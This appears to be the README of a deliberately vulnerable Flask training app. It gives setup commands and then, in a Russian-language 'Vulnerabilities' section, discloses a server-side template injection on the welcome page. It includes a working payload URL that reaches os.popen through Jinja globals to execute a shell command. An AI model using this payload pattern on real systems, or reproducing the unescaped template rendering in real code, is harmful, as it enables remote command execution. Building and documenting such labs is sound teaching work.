---
services: app-service\web,app-service
platforms: python
author: cephalin
---

```
pip install -r requirements.txt
cd app
flask db upgrade && flask run -h 0.0.0.0 -p 5000
```
Логи сохраняются в app/record.log
Tested on python 3.8.3
# Config
Приложение конфигурируется через файл app.env или через переменные окружения
# Уязвимости
На страницу welcome в параметре user есть ssti. Пример:
http://localhost:5000/welcome?user={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}
# Contributing

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
